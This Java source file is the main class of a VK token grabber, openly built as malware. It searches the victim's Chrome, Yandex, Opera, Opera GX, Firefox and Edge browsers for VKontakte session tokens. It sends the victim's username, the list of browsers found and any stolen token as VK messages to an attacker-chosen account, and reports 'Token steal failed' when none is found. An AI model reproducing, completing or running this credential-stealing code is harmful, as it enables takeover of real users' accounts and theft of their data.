package com.github.dedinc.vktokengrabber;

import java.text.SimpleDateFormat;
import java.util.Calendar;

import com.github.dedinc.vktokengrabber.browsers.BrowserManager;
import com.github.dedinc.vktokengrabber.utils.Handler;
import com.github.dedinc.vktokengrabber.utils.Helper;

public class Main {
	
	public static String token = "VK TOKEN";
	public static int receiver = 1337; //VK ID to send logs
	public static String scope_url = "https://vk.cc/bZw4Bu";
	public static String cd = System.getenv("systemDrive");
	public static String username = System.getenv("USERNAME");

	public static void main(String[] args)  {
		String browser = null;
		if (args.length > 0) {
			browser = args[0];
		}
		String token = "";
		Handler handler = Helper.getHander();
		handler.handle(browser);
		try {
			Helper.getVK().sendMessage("[" + new SimpleDateFormat("HH:mm:ss").format(Calendar.getInstance().getTime().getTime()) + "] - Searching token on " + username + "\n\nBrowsers: \n" + handler.getBrowsers());		
		   } catch (Exception e) {
		}
		if (handler.chr) {
			try {
				token = BrowserManager.getChrome().grab();
				if (token != null) {
					Helper.getVK().sendMessage(token);
					return;
				 }
			   } catch (Exception e) {
			}
		}
		if (handler.yan) {
			try {
				token = BrowserManager.getYandex().grab();
				if (token != null) {
					Helper.getVK().sendMessage(token);
					return;
				 }
			   } catch (Exception e) {
			}
		}
		if (handler.opr) {
			try {
				token = BrowserManager.getOpera().grab(false);
				if (token != null) {
					Helper.getVK().sendMessage(token);
					return;
				 }
			   } catch (Exception e) {
			}
		}
		if (handler.opr_gx) {
			try {
				token = BrowserManager.getOpera().grab(true);
				if (token != null) {
					Helper.getVK().sendMessage(token);
					return;
				 }
			   } catch (Exception e) {
			}
		}
		if (handler.frx) {
			try {
				token = BrowserManager.getFirefox().grab();
				if (token != null) {
					Helper.getVK().sendMessage(token);
					return;
				}
			  } catch (Exception e) {
			}
		 }		
		if (handler.edg) {
			try {
				token = BrowserManager.getEdge().grab();
				if (token != null) {
					Helper.getVK().sendMessage(token);
					return;
				}
			  } catch (Exception e) {
			}
		}
		Helper.getVK().sendMessage("Token steal failed :(");
		System.exit(0);
	 }
}